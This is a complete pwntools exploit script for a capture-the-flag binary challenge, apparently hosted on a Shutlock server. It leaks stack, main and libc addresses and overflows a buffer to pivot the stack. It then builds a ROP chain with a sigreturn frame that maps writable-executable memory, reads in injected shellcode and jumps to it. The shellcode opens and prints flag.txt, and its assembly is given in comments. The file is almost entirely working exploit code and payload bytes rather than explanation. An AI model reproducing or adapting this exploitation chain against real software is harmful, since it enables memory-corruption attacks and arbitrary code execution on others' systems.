from pwn import *
from time import sleep
import requests

IS_LOCAL = False
DEBUG = True
IS_GDB = False

################################################ change this !!!
LIBC_PATH = '/lib/x86_64-linux-gnu/libc.so.6' if IS_LOCAL else './libc6_2.35-0ubuntu3.8_amd64.so'
OFFSET_start_call_main = 0x7a if IS_LOCAL else 0x80
OFFSET_START_CALL_MAIN_START_MAIN = 0xb0 if IS_LOCAL else 0xb0
#################################################

if DEBUG:
	context.log_level = 'debug'

context.arch = 'amd64'

def toHex(data):
	return ''.join([hex(b)[2:].rjust(2, '0') for b in data])

def find_gadget(gadget):
	result = rop_libc.find_gadget(gadget)
	if not result:
		raise Exception(f'Gadget not found: {gadget}')
	return result.address + libc.address


libc = ELF(LIBC_PATH)
rop_libc = ROP(libc)

if IS_LOCAL:
	p = process('chall')
else:
	p = remote('challenges.shutlock.fr', 50010)

# start gdb and break
if IS_GDB:
	gdb.attach(p, '''
		b *upside_down_world_out
		continue
	''')


########################################### STEP 1 : leak stack address and main address
p.recvuntil('Who are you stranger')
p.sendline('A')
p.recv(100)

data = p.recv(100)
addr__main = u64(data[8*9:8*10])
stack = u64(data[8*4:8*5])

ADDR_MAIN = addr__main - 357
RELOOP_ADDR = ADDR_MAIN + 0x1cb
ADDR_STACK = stack + (8*16)
ADDR_STR_PATH_FLAG = ADDR_STACK - 0xCF
ADDR_SHELLCODE = 0x10000

log.info("<main> addr: " + hex(ADDR_MAIN))
log.info("Reloop addr: " + hex(RELOOP_ADDR))
log.info("<stack> addr: " + hex(ADDR_STACK))

########################################### STEP 2 : stack pivoting + leak __libc_start_call_main address
p.sendline(b'B'.ljust(72-8, b"\x00") + p64(stack+(8*14)) + p64(RELOOP_ADDR))
p.sendline(b'A')
p.recv(100)
p.recv(100)

data = p.recv(100)
ADDR_start_call_main = u64(data[8*11:8*12]) - OFFSET_start_call_main
ADDR_start_main = ADDR_start_call_main + OFFSET_START_CALL_MAIN_START_MAIN

log.info("<__libc_start_call_main> addr: " + hex(ADDR_start_call_main))
log.info("<libc__start_main> addr: " + hex(ADDR_start_main))

# Rebase libc
libc.address = ADDR_start_main - libc.symbols['__libc_start_main']
log.info("libc addr: " + hex(libc.address))

# Waiting for the message inviting us to send the payload...
p.recvuntil('Who are you stranger')

# Construct ROPChain
rchain = ROP([])


################################################### Call sys_mmap in use sys_rt_sigreturn
# -----------------> sys_rt_sigreturn
rchain.raw(find_gadget(['pop rax', 'ret']))
rchain.raw(0xf) # syscall id <sys_rt_sigreturn>

rchain.raw(find_gadget(['syscall', 'ret']))

# <sys_mmap> to allocate memory on a 32-bit address (for shellcode)
frame = SigreturnFrame()
frame.rax = 0x9            	# syscall number for sys_mmap
frame.rdi = ADDR_SHELLCODE  # addr
frame.rsi = 500             # len
frame.rdx = 0x7             # prot RWX
frame.r10 = 0x22            # flags MAP_PRIVATE | MAP_ANONYMOUS
frame.r8 = 	0x0            	# fd
frame.r9 = 	0x0            	# off
frame.rsp = ADDR_STACK + 0x108
frame.rbp = ADDR_STACK + 0x400
frame.rip = find_gadget(['syscall', 'ret'])
rchain.raw(bytes(frame))


#################### Call sys_read(stdin, addr_mmap, 200) => Write shellcode
# mov rax, 0
# mov rdx, 200
# mov rdi, stdin
# mov rsi, shellcode_addr
# syscall

# ------------------> rdx = 200
if IS_LOCAL:
	rchain.raw(find_gadget(['pop rbx', 'ret']))
	rchain.raw(200)

	# mov rdx, rbx; pop rbx; pop r12; pop rbp; ret
	rchain.raw(0x000b0123 + libc.address)
	rchain.raw(0x0)
	rchain.raw(0x0)
	rchain.raw(ADDR_STACK) # Conserve rbp with a value belonging to the stack

else:
	rchain.raw(find_gadget(['pop r12', 'ret']))
	rchain.raw(200)

	# mov rdx, r12; pop r12; pop r13; ret
	rchain.raw(0x000a80c8 + libc.address)
	rchain.raw(0)
	rchain.raw(0)
# ------------------>

rchain.raw(find_gadget(['pop rax', 'ret']))
rchain.raw(0) # sys_read

rchain.raw(find_gadget(['pop rdi', 'ret']))
rchain.raw(0) # fd stdin

# rdx=200

rchain.raw(find_gadget(['pop rsi', 'ret'])) # buffer
rchain.raw(ADDR_SHELLCODE)

rchain.raw(find_gadget(['syscall', 'ret']))


#################### DEBUG -----> checks if the shellcode was written correctly
# ; sys_write(stdout, shellcode_addr, 200)
# mov rax, 1
# mov rdi, 1
# mov rsi, shellcode_addr
# syscall

rchain.raw(find_gadget(['pop rax', 'ret']))
rchain.raw(1) # sys_write

rchain.raw(find_gadget(['pop rdi', 'ret']))
rchain.raw(1) # fd stdout

rchain.raw(find_gadget(['pop rsi', 'ret']))
rchain.raw(ADDR_SHELLCODE) # buffer

rchain.raw(find_gadget(['syscall', 'ret']))


#################### place in rsi the start of the shellcode to execute before jumping to it (offset 9 because of the flag path)
rchain.raw(find_gadget(['pop rsi', 'ret']))
rchain.raw(ADDR_SHELLCODE + 9)

# push rsi ; ret
a = 0x0002c446 if IS_LOCAL else 0x00041823
rchain.raw(a + libc.address)

# Loop back through the program to ensure emptying of the stdout buffer
rchain.raw(RELOOP_ADDR)

# ----------------------------------------------------------------------------------
try:
	# Send the ropchain 
	p.sendline(b'B'*(72-8) + p64(stack+(8*14)) + rchain.chain())

	if IS_GDB: # if gdb is open, wait before sending shellcode
		input()

	# send shellcode
	p.sendline(b'flag.txt\x00' + b'\x90'*60 + b'\x48\x31\xC9\x48\x31\xD2\x48\xC7\xC3\x00\x00\x01\x00\x48\xC7\xC0\x05\x00\x00\x00\xCD\x80\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\x00\x00\x01\x00\x48\xC7\xC2\x3C\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x00\x00\x01\x00\x48\xC7\xC2\x3C\x00\x00\x00\x0F\x05\xc3')
	
except EOFError:
	print("FAILED")

p.interactive()


# ------------------------- Shellcode
# ; fd = sys_open("flag.txt", "r", NULL)
# 0:  48 31 c9                xor    rcx,rcx
# 3:  48 31 d2                xor    rdx,rdx
# 6:  48 c7 c3 00 00 01 00    mov    rbx,0x10000
# d:  48 c7 c0 05 00 00 00    mov    rax,0x5
# 14: cd 80                   int    0x80
#
# ; sys_read(fd, buffer_addr, 60)
# 16: 48 89 c7                mov    rdi,rax
# 19: 48 31 c0                xor    rax,rax
# 1c: 48 c7 c6 00 00 01 00    mov    rsi,0x10000
# 23: 48 c7 c2 3c 00 00 00    mov    rdx,0x3c
# 2a: 0f 05                   syscall
#
# ; sys_write(stdin, buffer_addr, 60)
# 2c: 48 c7 c0 01 00 00 00    mov    rax,0x1
# 33: 48 c7 c7 01 00 00 00    mov    rdi,0x1
# 3a: 48 c7 c6 00 00 01 00    mov    rsi,0x10000
# 41: 48 c7 c2 3c 00 00 00    mov    rdx,0x3c
# 48: 0f 05                   syscall
#
# ; loop back through the program
# 4a: c3                      ret
# -----------------------

# xor rcx,rcx
# xor rdx,rdx
# mov rbx, 0x10000
# mov rax, 5
# int 0x80

# mov rdi, rax
# xor rax, rax
# mov rsi, 0x10000
# mov rdx, 60
# syscall

# mov rax, 1
# mov rdi, 1
# mov rsi, 0x10000
# mov rdx, 60
# syscall

# ret

